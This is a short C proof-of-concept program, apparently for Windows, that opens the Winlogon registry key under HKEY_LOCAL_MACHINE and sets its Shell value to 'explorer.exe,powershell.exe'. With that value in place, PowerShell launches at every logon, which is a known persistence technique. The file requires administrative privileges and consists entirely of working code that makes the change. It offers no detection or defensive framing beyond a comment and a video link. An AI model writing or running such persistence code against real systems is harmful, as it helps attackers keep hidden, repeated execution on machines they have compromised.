#include <windows.h>
#include <stdio.h>

// This POC executes powershell.exe on system logon
// It requires administrative privileges
// https://youtu.be/VqDY2Tfz6Qw?t=20

int main() {
    HKEY hKey;
    LPCSTR subKey = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
    LPCSTR valueName = "Shell";
    LPCSTR newValue = "explorer.exe,powershell.exe";

    LONG openResult = RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_SET_VALUE, &hKey);
    if (openResult != ERROR_SUCCESS) {
        printf("Error opening registry key. Error code: %d\n", openResult);
        return 1;
    }

    LONG setResult = RegSetValueExA(hKey, valueName, 0, REG_SZ, (BYTE*)newValue, strlen(newValue) + 1);
    if (setResult != ERROR_SUCCESS) {
        printf("Error setting registry value. Error code: %d\n", setResult);
        RegCloseKey(hKey);
        return 1;
    }

    printf("Registry value changed successfully.\n");

    RegCloseKey(hKey);
    return 0;
}